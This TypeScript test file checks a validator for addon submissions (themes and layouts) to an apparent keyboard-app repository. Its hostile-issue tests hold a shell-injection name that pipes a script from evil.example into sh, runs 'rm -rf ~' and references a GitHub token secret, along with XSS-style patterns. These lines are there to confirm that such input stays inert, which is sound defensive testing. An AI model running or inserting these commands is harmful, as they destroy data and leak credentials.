import assert from 'node:assert/strict';
import { describe, it } from 'node:test';
import { strToU8, zipSync } from 'fflate';
import { renderSticky } from '../src/comment.ts';
import { encodePayload } from '../src/payload.ts';
import { ALICE, BOB, body, evaluate, fixture, meta, tree, vectors } from './helpers.ts';

const THEME = vectors()[1]!.json;
const LAYOUT = vectors()[2]!.json;
const failing = (r: { checks: { title: string; ok: boolean }[] }) => r.checks.filter((c) => !c.ok).map((c) => c.title);

describe('a good theme', () => {
	it('passes and gets its id from the name', async () => {
		const r = await evaluate(fixture('theme-encoded.md'));
		assert.deepEqual(failing(r), []);
		assert.equal(r.ok, true);
		assert.equal(r.type, 'theme');
		assert.equal(r.id, 'midnight-typewriter');
		assert.equal(r.isUpdate, false);
		assert.deepEqual(r.tags, ['dark', 'retro', 'mono']);
		assert.deepEqual(JSON.parse(r.payload!), JSON.parse(THEME));
	});

	it('takes pasted JSON as well as the encoded string', async () => {
		const r = await evaluate(body({ name: 'Pasted', payload: '```json\n' + THEME + '\n```' }));
		assert.equal(r.ok, true);
	});

	it('takes an attached zip', async () => {
		const zip = zipSync({ 'theme.wmtheme.json': strToU8(THEME) });
		const fetchImpl = (async (url: string) => {
			assert.equal(url, 'https://github.com/user-attachments/files/99/noir.zip');
			return new Response(zip);
		}) as typeof fetch;
		const r = await evaluate(body({ name: 'Zipped', payload: '[noir.zip](https://github.com/user-attachments/files/99/noir.zip)' }), { fetchImpl });
		assert.equal(r.ok, true);
		assert.match(r.checks.find((c) => c.title === 'Payload')!.detail!, /zip/);
	});

	it('credits a remix', async () => {
		const r = await evaluate(body({ name: 'Remix', based_on: 'com.wasimaster.wmkeyboard.official/typewriter-noir', payload: encodePayload(THEME) }));
		assert.equal(r.ok, true);
		assert.equal(r.basedOn, 'com.wasimaster.wmkeyboard.official/typewriter-noir');
	});

	it('flags a theme whose colours match a published one, without blocking it', async () => {
		const root = tree([{ meta: meta({ id: 'noir', type: 'theme' }), payload: THEME }]);
		const r = await evaluate(body({ name: 'Noir again', payload: encodePayload(THEME) }), { root, user: BOB });
		assert.equal(r.ok, true);
		assert.match(r.warnings.join(), /very close to `noir`/);
	});
});

describe('a layout', () => {
	it('wraps a copied layer into a layout and drops its themeId', async () => {
		const r = await evaluate(fixture('layout-layer.md'), { type: 'layout' });
		assert.deepEqual(failing(r), []);
		assert.equal(r.type, 'layout');
		assert.equal(r.id, 'edit-row-qwerty');
		const env = JSON.parse(r.payload!);
		assert.equal(env.format, 'wmkeyboard-layout');
		assert.equal(env.version, 1);
		assert.equal(env.layout.id, 'edit-row-qwerty');
		assert.equal(env.layout.name, 'Edit Row QWERTY');
		assert.deepEqual(Object.keys(env.layout.layers), ['letters']);
		assert.equal('themeId' in env.layout.layers.letters, false);
		assert.deepEqual(env.layout.layers.letters.rows, JSON.parse(LAYOUT).layout.layers.letters.rows);
		assert.match(r.warnings.join(' '), /single copied layer/);
		assert.match(r.warnings.join(' '), /named a theme from your phone/);
	});

	it('keeps a full layout as it is, minus themeIds', async () => {
		const withTheme = JSON.parse(LAYOUT);
		withTheme.layout.themeId = 'custom_9';
		withTheme.layout.layers.letters.themeId = 'custom_9';
		const r = await evaluate(body({ name: 'Edit row', payload: encodePayload(JSON.stringify(withTheme)) }, 'Layout'), { type: 'layout' });
		assert.equal(r.ok, true);
		const env = JSON.parse(r.payload!);
		assert.equal(env.layout.themeId, undefined);
		assert.equal(env.layout.layers.letters.themeId, undefined);
		assert.equal(env.layout.id, JSON.parse(LAYOUT).layout.id);
	});

	it('refuses a layout sent with the theme form', async () => {
		const r = await evaluate(body({ name: 'Wrong form', payload: encodePayload(LAYOUT) }), { type: 'theme' });
		assert.deepEqual(failing(r), ['Form type']);
	});
});

describe('form rules', () => {
	it('needs the rights box, a licence and a name', async () => {
		const r = await evaluate(body({ name: '', license: 'MIT', rights: '- [ ] I made this', payload: encodePayload(THEME) }));
		assert.deepEqual(failing(r).sort(), ['Addon id', 'License', 'Name', 'Rights confirmed']);
		assert.equal(r.ok, false);
	});

	it('refuses blocklisted words as whole words only', async () => {
		const bad = await evaluate(body({ name: 'Official Casino Theme', payload: encodePayload(THEME) }));
		assert.ok(failing(bad).includes('Name'));
		const fine = await evaluate(body({ name: 'Casinoesque', payload: encodePayload(THEME) }));
		assert.equal(fine.ok, true);
	});

	it('refuses a taken id, and tells its owner how to update', async () => {
		const root = tree([{ meta: meta({ id: 'midnight-typewriter', type: 'theme' }), payload: THEME }]);
		const other = await evaluate(fixture('theme-encoded.md'), { root, user: BOB });
		assert.match(other.checks.find((c) => c.title === 'Addon id')!.detail!, /is taken/);
		const owner = await evaluate(fixture('theme-encoded.md'), { root, user: ALICE });
		assert.match(owner.checks.find((c) => c.title === 'Addon id')!.detail!, /put `midnight-typewriter` in "Updates"/);
	});

	it('lets the owner update by numeric user id, not login', async () => {
		const root = tree([{ meta: meta({ id: 'noir', type: 'theme', version: '1.2.0' }), payload: THEME }]);
		const renamedOwner = await evaluate(body({ name: 'Noir', updates: 'noir', payload: encodePayload(THEME) }), { root, user: { login: 'alice-new', id: ALICE.id } });
		assert.equal(renamedOwner.ok, true);
		assert.equal(renamedOwner.isUpdate, true);
		assert.equal(renamedOwner.id, 'noir');
		const impostor = await evaluate(body({ name: 'Noir', updates: 'noir', payload: encodePayload(THEME) }), { root, user: { login: 'alice', id: 666 } });
		assert.match(impostor.checks.find((c) => c.title === 'Addon id')!.detail!, /published by someone else/);
	});

	it('refuses an update of an addon that is not there or is another type', async () => {
		const root = tree([{ meta: meta({ id: 'qwerty-plus', type: 'layout' }), payload: LAYOUT }]);
		const missing = await evaluate(body({ updates: 'nope', payload: encodePayload(THEME) }), { root });
		assert.match(missing.checks.find((c) => c.title === 'Addon id')!.detail!, /not published here/);
		const wrongType = await evaluate(body({ updates: 'qwerty-plus', payload: encodePayload(THEME) }), { root });
		assert.match(wrongType.checks.find((c) => c.title === 'Addon id')!.detail!, /is a layout/);
	});

	it('uses a maintainer rename over the name', async () => {
		const r = await evaluate(fixture('theme-encoded.md'), { rename: 'noir-typewriter' });
		assert.equal(r.id, 'noir-typewriter');
	});

	it('refuses a malformed based_on', async () => {
		const r = await evaluate(body({ based_on: 'see my other theme!', payload: encodePayload(THEME) }));
		assert.deepEqual(failing(r), ['Remix credit']);
	});
});

describe('a hostile issue', () => {
	it('is refused for its payload, with every field kept as inert text', async () => {
		const r = await evaluate(fixture('hostile.md'));
		assert.equal(r.ok, false);
		assert.equal(r.payload, null);
		assert.match(r.checks.find((c) => c.title === 'Payload')!.detail!, /unpacks to more than 16 MB/);
		assert.equal(r.name, '$(curl -s https://evil.example/x | sh) `rm -rf ~` ${{ secrets.GITHUB_TOKEN }}');
		assert.ok(r.id === null || /^[a-z0-9-]+$/.test(r.id));
	});

	it('renders a comment with nothing live in it', async () => {
		const r = await evaluate(fixture('hostile.md'));
		const { payload: _, ...summary } = r;
		const comment = renderSticky({ stage: 'form', submission: { ...summary, id: summary.id ?? 'x' }, repo: 'o/r', runId: '1' });
		assert.doesNotMatch(comment, /<img src=x/);
		assert.doesNotMatch(comment, /<script>/);
		assert.doesNotMatch(comment, /@wasi-master/);
		assert.doesNotMatch(comment, /\]\(javascript:/);
		assert.doesNotMatch(comment, /(?<!\\)`rm -rf/);
	});

	it('cleans control and direction-override characters out of names', async () => {
		const r = await evaluate(body({ name: 'Nice‮exe.txt\u0007 theme', payload: encodePayload(THEME) }));
		assert.equal(r.name, 'Niceexe.txt theme');
	});

	it('refuses an over-long name and description', async () => {
		const r = await evaluate(body({ name: 'n'.repeat(61), description: 'd'.repeat(501), payload: encodePayload(THEME) }));
		assert.ok(failing(r).includes('Name'));
		assert.ok(failing(r).includes('Description'));
	});
});
